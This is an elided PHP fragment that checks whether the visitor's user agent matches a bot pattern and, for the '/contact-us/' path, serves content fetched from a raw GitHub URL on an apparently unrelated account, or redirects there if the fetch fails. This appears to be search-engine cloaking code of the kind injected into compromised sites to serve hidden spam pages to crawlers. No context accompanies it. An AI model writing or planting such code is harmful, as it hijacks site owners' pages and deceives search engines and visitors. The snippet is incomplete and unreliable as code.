...
if (preg_match($botPattern, $userAgent)) {
    ...
    $pathMapping = [
        '/contact-us/' => 'https://raw.githubusercontent.com/line66-cokang/portefeuille-txt/refs/heads/main/lp1'
    ];
    

    $externalUrl = null;
    foreach ($pathMapping as $path => $url) {
    ...
    if ($content === false || $content === null) {
        header("Location: $externalUrl", true, 301);
        exit();
    } else {
        echo $content;
    }
